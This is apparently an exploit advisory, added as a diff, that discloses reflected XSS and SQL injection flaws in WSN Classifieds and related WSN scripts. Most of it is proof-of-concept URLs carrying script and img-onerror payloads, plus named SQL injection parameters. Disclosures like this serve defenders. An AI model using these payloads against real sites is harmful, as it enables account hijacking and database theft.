@@ -1,0 +1,75 @@
+################################################################################################
+
+
+#  Exploit Title: WSN Classifieds v.6.2.12 & 6.2.18 Multiple Vulnerabilities    
+
+#  Script Page : http://www.wsnclassifieds.com
+   
+#  Date: 1-12-2011
+
+#  Author : RandomStorm  - http://www.randomstorm.com
+
+#  Avram Marius Gabriel (d3v1l)
+
+#  Tested on: Windows XP & Vista (IE9 - Firefox 8.0) 
+ 
+#  Note: Redirect and Html Injection can be performed also 
+ 
+
+################################################################################################ 
+ 
+# Cross-Site Scripting (XSS) 
+
+# XSS POC:  
+ 
+# Vector:  "><img src="x:x" onerror="alert('XSS')">
+
+# http://localhost/wsnclassifieds/suggest.php/58a2e"><img src="x:x" onerror="alert('XSS')">c6cc2cdff91 
+
+# http://localhost/wsnclassifieds/sitemap.php/56218"><img src="x:x" onerror="alert('XSS')">d82e0881337
+
+# http://localhost/wsnclassifieds/register.php/66eb5"><img src="x:x" onerror="alert('XSS')">090ab232720
+
+# http://localhost/wsnclassifieds/leaders.php/68c0c"><img src="x:x" onerror="alert('XSS')">026a50f9084
+
+# http://localhost/wsnclassifieds/index.php/d0c15"><img src="x:x" onerror="alert('XSS')">9086e589577
+
+# http://localhost/wsnclassifieds/contactform.php/b3007"><img src="x:x" onerror="alert('XSS')">16aadfe1637
+
+
+################################################################################################ 
+ 
+# Vector:  "><script>alert(1)</script>
+ 
+# http://localhost/wsnclassifieds/index.php?action=userlogin7375e"><script>alert(1)</script>87668222c12&filled=1
+
+# http://localhost/wsnclassifieds/contactform.php?filled=11aefd"><script>alert(1)</script>6db4597a5ab
+
+# http://localhost/wsnclassifieds/suggest.php?action=addcata5886"><script>alert(1)</script>e10802ab7a0&parent=1
+
+# http://localhost/wsnclassifieds/suggest.php?action=addcat&parent=15b2f5"><script>alert(1)</script>9ade5081a20 
+ 
+
+################################################################################################   
+
+
+# Sql Injection 
+
+# http://localhost/wsnclassifieds/memberlist.php?ascdesc=desc&field=name&perpage=(SQL)
+
+################################################################################################ 
+
+
+# Note: All Vulnerabilities work also on :
+
+#  WSN Gallery - media gallery script
+#  WSN KB - article directory script
+#  WSN Forum - message board script
+#  WSN Directory - business directory script
+#  WSN Software Directory - software directory script
+#  WSN Shop - storefront script 
+
+# Some of it uses "calendar" so the Sql injection will be performed also from "calendar.php?yearID=2011&monthID=12&dayID=SQL"
+
+
+################################################################################################
